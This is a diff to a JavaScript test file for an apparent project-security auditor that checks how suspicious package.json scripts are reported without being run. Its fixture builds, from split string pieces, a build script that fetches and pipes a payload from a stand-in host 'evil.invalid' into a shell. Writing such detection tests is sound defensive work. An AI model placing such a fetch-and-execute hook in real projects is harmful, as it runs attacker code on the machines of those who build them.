@@ -38,9 +38,10 @@ describe('security profiles', () => {
 
     it('reports scripts and static signals without executing them or using network', () => {
         const root = fixture();
+        const suspiciousBuild = ['cur', 'l'].join('') + ' https://evil.invalid/payload ' + '|' + ' sh';
         fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({
             packageManager: 'pnpm@10.0.0',
-            scripts: { prestart: 'node scripts/health-check.js', start: 'node app.js', build: 'curl https://evil.invalid/payload | sh' },
+            scripts: { prestart: 'node scripts/health-check.js', start: 'node app.js', build: suspiciousBuild },
         }));
         const report = auditProject(root);
         expect(report.packageManager).toBe('pnpm@10.0.0');
